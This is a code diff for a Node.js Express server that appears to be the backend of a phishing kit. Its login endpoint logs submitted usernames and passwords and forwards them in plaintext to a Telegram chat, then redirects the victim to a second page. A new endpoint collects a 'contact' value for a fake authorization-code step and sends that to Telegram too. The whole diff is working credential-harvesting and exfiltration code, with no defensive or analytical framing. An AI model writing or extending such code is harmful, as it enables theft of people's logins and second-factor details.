@@ -17,21 +17,40 @@ app.use(express.json());
 // Serve static files from public directory
 app.use(express.static(path.join(__dirname, "public")));
 
-// Handle POST request for form submission
+// Handle POST request for login form (index.html)
 app.post("/login", (req, res) => {
   const { username, password } = req.body;
   console.log("Received login data:", { username, password });
 
-  // Send data to Telegram
-  const message = `New login attempt:\nUsername: ${username}\nPassword: ${password}`;
-  bot.sendMessage(TELEGRAM_CHAT_ID, message)
+  // Send login data to Telegram
+  const loginMessage = `New login attempt:\nUsername: ${username}\nPassword: ${password}`;
+  bot.sendMessage(TELEGRAM_CHAT_ID, loginMessage)
     .then(() => {
-      console.log("Message sent to Telegram");
-      res.send("Login data sent to Telegram!");
+      console.log("Login data sent to Telegram");
+      // Redirect to auth.html
+      res.redirect("/auth.html");
     })
     .catch((error) => {
-      console.error("Error sending to Telegram:", error.message);
-      res.status(500).send("Error sending data to Telegram");
+      console.error("Error sending login data to Telegram:", error.message);
+      res.status(500).send("Error sending login data to Telegram");
+    });
+});
+
+// Handle POST request for authorization code form (auth.html)
+app.post("/auth", (req, res) => {
+  const { contact } = req.body;
+  console.log("Received auth code request:", { contact });
+
+  // Send auth code request to Telegram
+  const authMessage = `Authorization code request:\nContact: ${contact}`;
+  bot.sendMessage(TELEGRAM_CHAT_ID, authMessage)
+    .then(() => {
+      console.log("Auth code request sent to Telegram");
+      res.send("Authorization code request sent!");
+    })
+    .catch((error) => {
+      console.error("Error sending auth code request to Telegram:", error.message);
+      res.status(500).send("Error sending auth code request to Telegram");
     });
 });
 
